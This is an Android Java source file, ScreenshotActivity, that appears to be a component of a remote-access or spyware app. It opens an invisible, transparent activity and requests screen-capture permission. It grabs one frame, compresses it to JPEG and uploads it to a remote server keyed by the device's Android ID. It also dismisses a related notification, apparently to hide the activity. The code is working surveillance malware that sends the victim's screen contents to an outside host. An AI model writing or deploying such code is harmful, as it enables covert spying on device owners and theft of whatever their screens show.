package com.drnull.app;

import android.app.Activity;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenshotActivity extends Activity {
    private static final String TAG = "SCR";
    private static final int REQUEST_CODE = 1001;
    private MediaProjectionManager projectionManager;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int width, height, density;
    private String androidid;
    private String serverUrl;
    private boolean done = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        androidid = getIntent().getStringExtra("androidid");
        serverUrl = getIntent().getStringExtra("server");
        if (serverUrl == null || serverUrl.isEmpty()) {
            serverUrl = SecureConfig.getServerUrl();
        }

        // Transparent activity
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        );
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        );
        getWindow().setFormat(PixelFormat.TRANSLUCENT);
        getWindow().setBackgroundDrawableResource(android.R.color.transparent);

        getWindow().getDecorView().setAlpha(0f);

        // Screen dimensions
        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getRealMetrics(metrics);
        width = metrics.widthPixels;
        height = metrics.heightPixels;
        density = metrics.densityDpi;

        // Request MediaProjection
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (projectionManager != null) {
            try {
                startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_CODE);
            } catch (Exception e) {
                Log.e(TAG, "Failed to start projection", e);
                notifyFailed("projection_error");
                finish();
            }
        } else {
            notifyFailed("no_projection_manager");
            finish();
        }

        // Auto-finish timeout
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (!done) {
                notifyFailed("timeout");
                finish();
            }
        }, 8000);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                takeScreenshot(resultCode, data);
            } else {
                Log.d(TAG, "Permission denied");
                notifyFailed("permission_denied");
                finish();
            }
        } else {
            finish();
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    private void takeScreenshot(int resultCode, Intent data) {
        try {
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            MediaProjection projection = projectionManager.getMediaProjection(resultCode, data);

            if (projection == null) {
                notifyFailed("projection_null");
                finish();
                return;
            }

            virtualDisplay = projection.createVirtualDisplay("ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

            imageReader.setOnImageAvailableListener(reader -> {
                if (done) return;
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image == null) return;

                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                    bitmap.recycle();

                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    cropped.compress(Bitmap.CompressFormat.JPEG, 75, stream);
                    byte[] jpegData = stream.toByteArray();
                    cropped.recycle();
                    stream.close();

                    // Upload
                    String url = serverUrl + "/upload_screenshot?androidid=" + androidid;
                    WSService.upload(url, jpegData);

                    done = true;
                    cleanup(projection, reader);
                    new Handler(Looper.getMainLooper()).post(() -> finish());

                } catch (Exception e) {
                    Log.e(TAG, "Screenshot error", e);
                    done = true;
                    cleanup(projection, reader);
                    new Handler(Looper.getMainLooper()).post(() -> finish());
                } finally {
                    if (image != null) image.close();
                }
            }, new Handler(Looper.getMainLooper()));

        } catch (Exception e) {
            Log.e(TAG, "takeScreenshot error", e);
            notifyFailed("capture_error");
            finish();
        }
    }

    private void cleanup(MediaProjection projection, ImageReader reader) {
        try { if (virtualDisplay != null) virtualDisplay.release(); } catch(Exception e) {}
        try { if (reader != null) reader.close(); } catch(Exception e) {}
        try { if (projection != null) projection.stop(); } catch(Exception e) {}
    }

    private void notifyFailed(String reason) {
        try {
            // Dismiss screenshot notification
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.cancel(2);
        } catch(Exception e) {}
    }

    @Override
    public void onBackPressed() {
        done = true;
        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        done = true;
        super.onDestroy();
    }
}
